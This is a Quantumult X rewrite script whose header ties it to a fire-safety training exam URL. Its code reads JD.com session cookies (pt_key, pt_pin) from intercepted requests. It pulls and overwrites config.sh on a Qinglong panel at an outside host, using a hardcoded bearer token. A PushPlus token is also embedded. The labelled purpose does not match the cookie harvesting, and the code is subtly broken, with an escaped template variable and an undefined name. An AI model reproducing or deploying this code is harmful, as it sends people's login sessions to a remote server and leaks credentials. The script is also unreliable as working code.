/*圈X
[rewrite_local]
^https://xfzzgl.zjxf119.com/v1/xyxf/zzgl/trainingExam/Knowledge/readList url script-response-body https://raw.githubusercontent.com/390788781/own/main/Fire-test/Firetest1.js

*/
const $ = Env("name",true);
const timestamp = (new Date()).valueOf();
!(async () => {
  if (typeof $request !== "undefined") {
    await jdck()
  
  }
else{

$.log(`视频任务还剩${voide_time}S`)


}
})()
.catch((e) => $.logErr(e))
  .finally(() => $.done())



async function jdck(){


const req = $request;
  if (req.method != 'OPTIONS' && req.headers){



   const CV = (req.headers['Cookie'] || req.headers['cookie'] || '');
    const ckItems = CV.match(/(pt_key|pt_pin)=.+?;/g);

$.msg(`👏已获取京东cookie!👏`)

await find(ckItems)

}






$.done()

}





async function save(key,Data,timeout = 0) {


   return new Promise((resolve) => {

const request = {
    url: `http://www.domain1123.eu.org:5700/api/configs/save?t=${timestamp}`,
    headers: {
    "Host": "www.domain1123.eu.org:5700",
    "Accept": "application/json",
    "Authorization": "Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiZkYzbzNFbTJ1YVB1U3BOcUwzcjIzSXk1XzN5cjRzQVRIMXNGNWtfMHdPOEE1bUM5aXNTMDRMVzciLCJpYXQiOjE3MDQ3NzE3MTgsImV4cCI6MTcwNjQ5OTcxOH0.aZUucQ0qGIIav2oLRM-CUQxXqL_cy7PWMDZPYPomDsSPfV4nnVbgKbEB3XblT2kf",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json;charset=UTF-8",
    "Origin": "http://www.domain1123.eu.org:5700",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Connection": "keep-alive",
    "Referer": "http://www.domain1123.eu.org:5700/config",
    "Content-Length": "8095"
},
    body:`{\"content\":\"## Version: v2.8.0\\n## Date: 2021-06-20\\n## Update Content: \u53ef\u6301\u7eed\u53d1\u5c55\u7eb2\u8981\\\\n1. session\u7ba1\u7406\u7834\u574f\u6027\u4fee\u6539\\\\n2. \u914d\u7f6e\u7ba1\u7406\u53ef\u7f16\u8f91config\u4e0b\u6587\u4ef6\\\\n3. \u81ea\u5b9a\u4e49\u811a\u672c\u6539\u4e3a\u67e5\u770b\u811a\u672c\\\\n4. \u79fb\u9664\u4e92\u52a9\u76f8\u5173\\n\\n## \u4e0a\u9762\u7248\u672c\u53f7\u4e2d\uff0c\u5982\u679c\u7b2c2\u4f4d\u6570\u5b57\u6709\u53d8\u5316\uff0c\u90a3\u4e48\u4ee3\u8868\u589e\u52a0\u4e86\u65b0\u7684\u53c2\u6570\uff0c\u5982\u679c\u53ea\u6709\u7b2c3\u4f4d\u6570\u5b57\u6709\u53d8\u5316\uff0c\u4ec5\u4ee3\u8868\u66f4\u65b0\u4e86\u6ce8\u91ca\uff0c\u6ca1\u6709\u589e\u52a0\u65b0\u7684\u53c2\u6570\uff0c\u53ef\u66f4\u65b0\u53ef\u4e0d\u66f4\u65b0\\n\\n## \u5728\u8fd0\u884c ql repo \u547d\u4ee4\u65f6\uff0c\u662f\u5426\u81ea\u52a8\u5220\u9664\u5931\u6548\u7684\u811a\u672c\u4e0e\u5b9a\u65f6\u4efb\u52a1\\nAutoDelCron=\\\"true\\\"\\n\\n## \u5728\u8fd0\u884c ql repo \u547d\u4ee4\u65f6\uff0c\u662f\u5426\u81ea\u52a8\u589e\u52a0\u65b0\u7684\u672c\u5730\u5b9a\u65f6\u4efb\u52a1\\nAutoAddCron=\\\"true\\\"\\n\\n## \u62c9\u53d6\u811a\u672c\u65f6\u9ed8\u8ba4\u7684\u5b9a\u65f6\u89c4\u5219\uff0c\u5f53\u5339\u914d\u4e0d\u5230\u5b9a\u65f6\u89c4\u5219\u65f6\u4f7f\u7528\uff0c\u4f8b\u5982: 0 9 * * *\\nDefaultCronRule=\\\"\\\"\\n\\n## ql repo\u547d\u4ee4\u62c9\u53d6\u811a\u672c\u65f6\u9700\u8981\u62c9\u53d6\u7684\u6587\u4ef6\u540e\u7f00\uff0c\u76f4\u63a5\u5199\u6587\u4ef6\u540e\u7f00\u540d\u5373\u53ef\\nRepoFileExtensions=\\\"js py\\\"\\n\\n## \u4ee3\u7406\u5730\u5740\uff0c\u652f\u6301http/https/socks\uff0c\u4f8b\u5982 http://127.0.0.1:7890\\nProxyUrl=\\\"\\\"\\n\\n## \u8d44\u6e90\u544a\u8b66\u9619\u503c\uff0c\u9ed8\u8ba4CPU 80%\u3001\u5185\u5b5880%\u3001\u78c1\u76d890%\\nCpuWarn=80\\nMemoryWarn=80\\nDiskWarn=90\\n\\n## \u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1\u6267\u884c\u7684\u8d85\u65f6\u65f6\u95f4\uff0c\u9ed8\u8ba41h\uff0c\u540e\u7f00\\\"s\\\"\u4ee3\u8868\u79d2(\u9ed8\u8ba4\u503c), \\\"m\\\"\u4ee3\u8868\u5206, \\\"h\\\"\u4ee3\u8868\u5c0f\u65f6, \\\"d\\\"\u4ee3\u8868\u5929\\nCommandTimeoutTime=\\\"1h\\\"\\n\\n## \u8bbe\u7f6e\u6279\u91cf\u6267\u884c\u4efb\u52a1\u65f6\u7684\u5e76\u53d1\u6570\uff0c\u9ed8\u8ba4\u540c\u65f6\u6267\u884c5\u4e2a\u4efb\u52a1\\nMaxConcurrentNum=\\\"5\\\"\\n\\n## \u5728\u8fd0\u884c task \u547d\u4ee4\u65f6\uff0c\u968f\u673a\u5ef6\u8fdf\u542f\u52a8\u4efb\u52a1\u7684\u6700\u5927\u5ef6\u8fdf\u65f6\u95f4\\n## \u9ed8\u8ba4\u7ed9javascript\u4efb\u52a1\u52a0\u968f\u673a\u5ef6\u8fdf\uff0c\u5982 RandomDelay=\\\"300\\\" \uff0c\u8868\u793a\u4efb\u52a1\u5c06\u5728 1-300 \u79d2\u5185\u968f\u673a\u5ef6\u8fdf\u4e00\u4e2a\u79d2\u6570\uff0c\u7136\u540e\u518d\u8fd0\u884c\uff0c\u53d6\u6d88\u5ef6\u8fdf\u8d4b\u503c\u4e3a\u7a7a\\nRandomDelay=\\\"300\\\"\\n\\n## \u9700\u8981\u968f\u673a\u5ef6\u8fdf\u8fd0\u884c\u4efb\u52a1\u7684\u6587\u4ef6\u540e\u7f00\uff0c\u76f4\u63a5\u5199\u540e\u7f00\u540d\u5373\u53ef\uff0c\u591a\u4e2a\u540e\u7f00\u7528\u7a7a\u683c\u5206\u5f00\uff0c\u4f8b\u5982: js py ts\\n## \u9ed8\u8ba4\u4ec5\u7ed9javascript\u4efb\u52a1\u52a0\u968f\u673a\u5ef6\u8fdf\uff0c\u5176\u5b83\u4efb\u52a1\u6309\u5b9a\u65f6\u89c4\u5219\u51c6\u70b9\u8fd0\u884c\u3002\u5168\u90e8\u4efb\u52a1\u968f\u673a\u5ef6\u8fdf\u8d4b\u503c\u4e3a\u7a7a\\nRandomDelayFileExtensions=\\\"js\\\"\\n\\n## \u6bcf\u5c0f\u65f6\u7684\u7b2c\u51e0\u5206\u949f\u51c6\u70b9\u8fd0\u884c\u4efb\u52a1\uff0c\u5f53\u5728\u8fd9\u4e9b\u65f6\u95f4\u8fd0\u884c\u4efb\u52a1\u65f6\u5c06\u5ffd\u7565 RandomDelay \u914d\u7f6e\uff0c\u4e0d\u4f1a\u88ab\u968f\u673a\u5ef6\u8fdf\\n## \u9ed8\u8ba4\u662f\u7b2c0\u5206\u949f\u548c\u7b2c30\u5206\u949f\uff0c\u4f8b\u598221:00\u621621:30\u5206\u7684\u4efb\u52a1\u5c06\u4f1a\u51c6\u70b9\u8fd0\u884c\u3002\u4e0d\u9700\u8981\u51c6\u70b9\u8fd0\u884c\u8d4b\u503c\u4e3a\u7a7a\\nRandomDelayIgnoredMinutes=\\\"0 30\\\"\\n\\n## \u5982\u679c\u4f60\u81ea\u5df1\u4f1a\u5199shell\u811a\u672c\uff0c\u5e76\u4e14\u5e0c\u671b\u5728\u6bcf\u6b21\u8fd0\u884c ql update \u547d\u4ee4\u65f6\uff0c\u989d\u5916\u8fd0\u884c\u4f60\u7684 shell \u811a\u672c\uff0c\u8bf7\u8d4b\u503c\u4e3a \\\"true\\\"\uff0c\u9ed8\u8ba4\u4e3atrue\\nEnableExtraShell=\\\"true\\\"\\n\\n## \u662f\u5426\u81ea\u52a8\u542f\u52a8bot\uff0c\u9ed8\u8ba4\u4e0d\u542f\u52a8\uff0c\u8bbe\u7f6e\u4e3atrue\u65f6\u81ea\u52a8\u542f\u52a8\uff0c\u76ee\u524d\u9700\u8981\u81ea\u884c\u514b\u9686bot\u4ed3\u5e93\u6240\u9700\u4ee3\u7801\uff0c\u5b58\u5230ql/repo\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u5939\u547d\u540d\u4e3adockerbot\\nAutoStartBot=\\\"\\\"\\n\\n## \u662f\u5426\u4f7f\u7528\u7b2c\u4e09\u65b9bot\uff0c\u9ed8\u8ba4\u4e0d\u4f7f\u7528\uff0c\u4f7f\u7528\u65f6\u586b\u5165\u4ed3\u5e93\u5730\u5740\uff0c\u5b58\u5230ql/repo\u76ee\u5f55\u4e0b\uff0c\u6587\u4ef6\u5939\u547d\u540d\u4e3adiybot\\nBotRepoUrl=\\\"\\\"\\n\\n## \u5b89\u88c5python\u4f9d\u8d56\u65f6\u6307\u5b9apip\u6e90\\nPipMirror=\\\"https://pypi.doubanio.com/simple/\\\"\\n\\n## \u5b89\u88c5node\u4f9d\u8d56\u65f6\u6307\u5b9anpm\u6e90\\nNpmMirror=\\\"https://registry.npmmirror.com\\\"\\n\\n## \u901a\u77e5\u73af\u5883\u53d8\u91cf\\n## 1. Server\u9171\\n## https://sct.ftqq.com\\n## \u4e0b\u65b9\u586b\u5199 SCHKEY \u503c\u6216 SendKey \u503c\\nexport PUSH_KEY=\\\"\\\"\\n\\n## 2. BARK\\n## \u4e0b\u65b9\u586b\u5199app\u63d0\u4f9b\u7684\u8bbe\u5907\u7801\uff0c\u4f8b\u5982\uff1ahttps://api.day.app/123 \u90a3\u4e48\u6b64\u5904\u7684\u8bbe\u5907\u7801\u5c31\u662f123\\nexport BARK_PUSH=\\\"\\\"\\n## \u4e0b\u65b9\u586b\u5199\u63a8\u9001\u56fe\u6807\u8bbe\u7f6e\uff0c\u81ea\u5b9a\u4e49\u63a8\u9001\u56fe\u6807(\u9700iOS15\u6216\u4ee5\u4e0a)\\nexport BARK_ICON=\\\"http://qn.whyour.cn/logo.png\\\"\\n## \u4e0b\u65b9\u586b\u5199\u63a8\u9001\u58f0\u97f3\u8bbe\u7f6e\uff0c\u4f8b\u5982choo\uff0c\u5177\u4f53\u503c\u8bf7\u5728bark-\u63a8\u9001\u94c3\u58f0-\u67e5\u770b\u6240\u6709\u94c3\u58f0\\nexport BARK_SOUND=\\\"\\\"\\n## \u4e0b\u65b9\u586b\u5199\u63a8\u9001\u6d88\u606f\u5206\u7ec4\uff0c\u9ed8\u8ba4\u4e3a\\\"QingLong\\\"\\nexport BARK_GROUP=\\\"QingLong\\\"\\n\\n## 3. Telegram\\n## \u4e0b\u65b9\u586b\u5199\u81ea\u5df1\u7533\u8bf7@BotFather\u7684Token\uff0c\u598210xxx4:AAFcqxxxxgER5uw\\nexport TG_BOT_TOKEN=\\\"\\\"\\n## \u4e0b\u65b9\u586b\u5199 @getuseridbot \u4e2d\u83b7\u53d6\u5230\u7684\u7eaf\u6570\u5b57ID\\nexport TG_USER_ID=\\\"\\\"\\n## Telegram \u4ee3\u7406IP\uff08\u9009\u586b\uff09\\n## \u4e0b\u65b9\u586b\u5199\u4ee3\u7406IP\u5730\u5740\uff0c\u4ee3\u7406\u7c7b\u578b\u4e3a http\uff0c\u6bd4\u5982\u60a8\u4ee3\u7406\u662f http://127.0.0.1:1080\uff0c\u5219\u586b\u5199 \\\"127.0.0.1\\\"\\n## \u5982\u9700\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u89e3\u9664\u4e0b\u4e00\u884c\u7684\u6ce8\u91ca\\nexport TG_PROXY_HOST=\\\"\\\"\\n## Telegram \u4ee3\u7406\u7aef\u53e3\uff08\u9009\u586b\uff09\\n## \u4e0b\u65b9\u586b\u5199\u4ee3\u7406\u7aef\u53e3\u53f7\uff0c\u4ee3\u7406\u7c7b\u578b\u4e3a http\uff0c\u6bd4\u5982\u60a8\u4ee3\u7406\u662f http://127.0.0.1:1080\uff0c\u5219\u586b\u5199 \\\"1080\\\"\\n## \u5982\u9700\u4f7f\u7528\uff0c\u8bf7\u81ea\u884c\u89e3\u9664\u4e0b\u4e00\u884c\u7684\u6ce8\u91ca\\nexport TG_PROXY_PORT=\\\"\\\"\\n## Telegram \u4ee3\u7406\u7684\u8ba4\u8bc1\u53c2\u6570\uff08\u9009\u586b\uff09\\nexport TG_PROXY_AUTH=\\\"\\\"\\n## Telegram api\u81ea\u5efa\u53cd\u5411\u4ee3\u7406\u5730\u5740\uff08\u9009\u586b\uff09\\n## \u6559\u7a0b\uff1ahttps://www.hostloc.com/thread-805441-1-1.html\\n## \u5982\u53cd\u5411\u4ee3\u7406\u5730\u5740 http://aaa.bbb.ccc \u5219\u586b\u5199 aaa.bbb.ccc\\n## \u5982\u9700\u4f7f\u7528\uff0c\u8bf7\u8d4b\u503c\u4ee3\u7406\u5730\u5740\u94fe\u63a5\uff0c\u5e76\u81ea\u884c\u89e3\u9664\u4e0b\u4e00\u884c\u7684\u6ce8\u91ca\\nexport TG_API_HOST=\\\"\\\"\\n\\n## 4. \u9489\u9489\\n## \u5b98\u65b9\u6587\u6863\uff1ahttps://developers.dingtalk.com/document/app/custom-robot-access\\n## \u4e0b\u65b9\u586b\u5199token\u540e\u9762\u7684\u5185\u5bb9\uff0c\u53ea\u9700 https://oapi.dingtalk.com/robot/send?access_token=XXX \u7b49\u4e8e=\u7b26\u53f7\u540e\u9762\u7684XXX\u5373\u53ef\\nexport DD_BOT_TOKEN=\\\"\\\"\\nexport DD_BOT_SECRET=\\\"\\\"\\n\\n## 5. \u4f01\u4e1a\u5fae\u4fe1\u673a\u5668\u4eba\\n## \u5b98\u65b9\u8bf4\u660e\u6587\u6863\uff1ahttps://work.weixin.qq.com/api/doc/90000/90136/91770\\n## \u4e0b\u65b9\u586b\u5199\u5bc6\u94a5\uff0c\u4f01\u4e1a\u5fae\u4fe1\u63a8\u9001 webhook \u540e\u9762\u7684 key\\nexport QYWX_KEY=\\\"\\\"\\n\\n## 6. \u4f01\u4e1a\u5fae\u4fe1\u5e94\u7528\\n## \u53c2\u8003\u6587\u6863\uff1ahttp://note.youdao.com/s/HMiudGkb\\n## \u4e0b\u65b9\u586b\u5199\u7d20\u6750\u5e93\u56fe\u7247id\uff08corpid,corpsecret,touser,agentid\uff09\uff0c\u7d20\u6750\u5e93\u56fe\u7247\u586b0\u4e3a\u56fe\u6587\u6d88\u606f, \u586b1\u4e3a\u7eaf\u6587\u672c\u6d88\u606f\\nexport QYWX_AM=\\\"\\\"\\n\\n## 7. iGot\u805a\u5408\\n## \u53c2\u8003\u6587\u6863\uff1ahttps://wahao.github.io/Bark-MP-helper\\n## \u4e0b\u65b9\u586b\u5199iGot\u7684\u63a8\u9001key\uff0c\u652f\u6301\u591a\u65b9\u5f0f\u63a8\u9001\uff0c\u786e\u4fdd\u6d88\u606f\u53ef\u8fbe\\nexport IGOT_PUSH_KEY=\\\"\\\"\\n\\n## 8. Push Plus\\n## \u5b98\u65b9\u7f51\u7ad9\uff1ahttp://www.pushplus.plus\\n## \u4e0b\u65b9\u586b\u5199\u60a8\u7684Token\uff0c\u5fae\u4fe1\u626b\u7801\u767b\u5f55\u540e\u4e00\u5bf9\u4e00\u63a8\u9001\u6216\u4e00\u5bf9\u591a\u63a8\u9001\u4e0b\u9762\u7684token\uff0c\u53ea\u586b PUSH_PLUS_TOKEN \u9ed8\u8ba4\u4e3a\u4e00\u5bf9\u4e00\u63a8\u9001\\nexport PUSH_PLUS_TOKEN=\\\"317ba268b2d54cfeabbdd8ca6123b7e7\\\"\\n## \u4e00\u5bf9\u4e00\u591a\u63a8\u9001\uff08\u9009\u586b\uff09\\n## \u4e0b\u65b9\u586b\u5199\u60a8\u7684\u4e00\u5bf9\u591a\u63a8\u9001\u7684 \\\"\u7fa4\u7ec4\u7f16\u7801\\\" \uff0c\uff08\u4e00\u5bf9\u591a\u63a8\u9001\u4e0b\u9762->\u60a8\u7684\u7fa4\u7ec4(\u5982\u65e0\u5219\u65b0\u5efa)->\u7fa4\u7ec4\u7f16\u7801\uff09\\n## 1. \u9700\u8ba2\u9605\u8005\u626b\u63cf\u4e8c\u7ef4\u7801 2\u3001\u5982\u679c\u60a8\u662f\u521b\u5efa\u7fa4\u7ec4\u6240\u5c5e\u4eba\uff0c\u4e5f\u9700\u70b9\u51fb\u201c\u67e5\u770b\u4e8c\u7ef4\u7801\u201d\u626b\u63cf\u7ed1\u5b9a\uff0c\u5426\u5219\u4e0d\u80fd\u63a5\u53d7\u7fa4\u7ec4\u6d88\u606f\u63a8\u9001\\nexport PUSH_PLUS_USER=\\\"78827882\\\"\\n\\n## 9. go-cqhttp\\n## gobot_url \u63a8\u9001\u5230\u4e2a\u4ebaQQ: http://127.0.0.1/send_private_msg  \u7fa4\uff1ahttp://127.0.0.1/send_group_msg\\n## gobot_token \u586b\u5199\u5728go-cqhttp\u6587\u4ef6\u8bbe\u7f6e\u7684\u8bbf\u95ee\u5bc6\u94a5\\n## gobot_qq \u5982\u679cGOBOT_URL\u8bbe\u7f6e /send_private_msg \u5219\u9700\u8981\u586b\u5165 user_id=\u4e2a\u4ebaQQ \u76f8\u53cd\u5982\u679c\u662f /send_group_msg \u5219\u9700\u8981\u586b\u5165 group_id=QQ\u7fa4\\n## go-cqhttp\u76f8\u5173API https://docs.go-cqhttp.org/api\\nexport GOBOT_URL=\\\"\\\"\\nexport GOBOT_TOKEN=\\\"\\\"\\nexport GOBOT_QQ=\\\"\\\"\\n\\n## 10. gotify\\n## gotify_url \u586b\u5199gotify\u5730\u5740,\u5982https://push.example.de:8080\\n## gotify_token \u586b\u5199gotify\u7684\u6d88\u606f\u5e94\u7528token\\n## gotify_priority \u586b\u5199\u63a8\u9001\u6d88\u606f\u4f18\u5148\u7ea7,\u9ed8\u8ba4\u4e3a0\\nexport GOTIFY_URL=\\\"\\\"\\nexport GOTIFY_TOKEN=\\\"\\\"\\nexport GOTIFY_PRIORITY=0\\n\\n## 11. PushDeer\\n## deer_key \u586b\u5199PushDeer\u7684key\\nexport DEER_KEY=\\\"\\\"\\n\\n## 12. Chat\\n## chat_url \u586b\u5199synology chat\u5730\u5740\uff0chttp://IP:PORT/webapi/***token=\\n## chat_token \u586b\u5199\u540e\u9762\u7684token\\nexport CHAT_URL=\\\"\\\"\\nexport CHAT_TOKEN=\\\"\\\"\\n\\n\\n#\u5f00\u542f\u4f9d\u8d56\u4fee\u590d\\n\\nexport ec_fix_dep=\\\"true\\\"\\n\\n#\u7981\u7528\u91cd\u590d\u811a\u672c\u62a5\u9519\\n\\nexport IPPORT=\'127.0.0.1:5700\'\\n#\u4e34\u671f\u4eac\u8c46\u6362\u79ef\u5206\\nexport DY_WASHBEANS=\\\"true\\\"\\n\\n\\nCXJNUM=\'50\'\\n\\n## \u5176\u4ed6\u9700\u8981\u7684\u53d8\u91cf\uff0c\u811a\u672c\u4e2d\u9700\u8981\u7684\u53d8\u91cf\u4f7f\u7528 export \u53d8\u91cf\u540d= \u58f0\u660e\u5373\u53ef\\nexport JD_COOKIE=\\${Data},\"name\":\"config.sh\"}`,
};



      $.post(request, async (err, resp, data) => {
        try {
           
        const result = JSON.parse(data)
        if(result.code == 200){
$.msg(`👏${key}数据${result.message}`)


}else{
        //console.log("提交成功：" + JSON.stringify(result))
$.msg(`😱${key}提交数据失败!->${JSON.stringify(result.message)}`)
        
}
            $done()
        } catch (e) {
          //$.logErr(e, resp);
        }finally {
          resolve()
        }
    },timeout)
  })
 
}







async function find(cookie,timeout = 0) {
   return new Promise((resolve) => {

const request_get = {
    url: `http://www.domain1123.eu.org:5700/api/configs/config.sh?t=${timestamp}`,
    headers: {
    "Host": "www.domain1123.eu.org:5700",
    "Accept-Language": "zh-CN,zh-Hans;q=0.9",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "baggage": "sentry-release=2.14.7,sentry-public_key=3406424fb1dc4813a62d39e844a9d0ac,sentry-trace_id=258e5ae6f1eb473b83aae39ba6ce7fe1,sentry-sample_rate=0.1",
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Authorization": "Bearer eyJhbGciOiJIUzM4NCIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoiZkYzbzNFbTJ1YVB1U3BOcUwzcjIzSXk1XzN5cjRzQVRIMXNGNWtfMHdPOEE1bUM5aXNTMDRMVzciLCJpYXQiOjE3MDQ3NzE3MTgsImV4cCI6MTcwNjQ5OTcxOH0.aZUucQ0qGIIav2oLRM-CUQxXqL_cy7PWMDZPYPomDsSPfV4nnVbgKbEB3XblT2kf",
    "Referer": "http://www.domain1123.eu.org:5700/config",
    "sentry-trace": "258e5ae6f1eb473b83aae39ba6ce7fe1-94ae0ab5c3b6cd93-1"
},
    body: ""
};

      $.get(request_get, async (err, resp, data) => {
        try {
           
        var result = JSON.parse(data)
        if(result.code == 200){
            console.log("获取青龙到数据！" )

const key = cookie[1].match(/.*pt_pin=([^;]+);/).slice(1);

const value = cookie[0].match(/.*pt_key=([^;]+);/).slice(1);

const first_data =JSON.parse(data).data.split('JD_COOKIE=')[0]
const change = JSON.parse(data).data.split('JD_COOKIE=')[1]


const cookiePairs = change.split('&').filter(pair => pair.includes('pt_key') && pair.includes('pt_pin')); // Create an array to store extracted values 
const Result = cookiePairs.map(pair => { 
       const [pt_key, pt_pin] = pair.match(/pt_key=([^;]+);.*pt_pin=([^;]+);/).slice(1);               return { pt_key, pt_pin }; }); 

let fengge =''
let cookie_data =""

Result.forEach((item,index)=>{

if(item.pt_pin==key){
      item.pt_key=value
}

if(index < 1){
   cookie_data =cookie_data+ `pt_key=${item.pt_key}; pt_pin=${item.pt_pin};`+"\n"



}else{
   cookie_data =cookie_data+ `&pt_key=${item.pt_key}; pt_pin=${item.pt_pin};`+"\n"


}





})
cookie_data =cookie_data +`"`

 let Data = `{"content":${first_data}JD_COOKIE="${cookie_data }","name":"config.sh"}`

Data = JSON.stringify(`${cookie_data }`)
$.log(key)

$.msg("👏恭喜获取青龙配置👏")

await save(key,Data)







}else{
        console.log("无法获取青龙数据！" + data)
        

}
//$.log(JSON.stringify(result.data))


            $done()
        } catch (e) {
          //$.logErr(e, resp);
        }finally {
          resolve()
        }
    },timeout)
  })
 
}

  //find()












function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),a={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(a,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t){let e={"M+":(new Date).getMonth()+1,"d+":(new Date).getDate(),"H+":(new Date).getHours(),"m+":(new Date).getMinutes(),"s+":(new Date).getSeconds(),"q+":Math.floor(((new Date).getMonth()+3)/3),S:(new Date).getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,((new Date).getFullYear()+"").substr(4-RegExp.$1.length)));for(let s in e)new 